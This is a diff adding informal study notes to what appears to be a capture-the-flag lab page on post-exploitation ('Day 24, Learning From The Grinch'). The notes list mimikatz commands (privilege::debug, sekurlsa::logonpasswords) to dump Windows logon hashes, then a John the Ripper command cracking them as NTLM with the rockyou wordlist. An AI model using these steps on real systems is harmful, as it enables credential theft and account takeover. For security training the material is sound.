@@ -1,3 +1,35 @@
+#Key Takeaway
+post escalation to make the attacker higher privilege on the victim machine after broke the machine
+
+for this task in the windows terminal
+Tips btw wan specify a path just drag the file into the terminal no need mnual type
+run .\mimikatz.exe (github got)
+1)privilege::debug (check u got enuf privilege to run the program anot)
+2)sekurlsa::logonpasswords (see all logonpassowrd hash)
+
+then in any linux terminal
+echo <passwordhash> > hash.txt
+
+Crack with John the Ripper
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --pot=hash.pot
+--format=NT → tells John it’s an NTLM Windows hash.
+--wordlist=rockyou.txt → common password list.
+--pot=hash.pot → saves cracked results for reuse.
+
+Show Cracked Password
+john --show hash.txt
+
+
+
+
+
+
+
+
+
+
+
+
 Task 29
 [Day 24] Post Exploitation Learning From The Grinch
 Start Machine
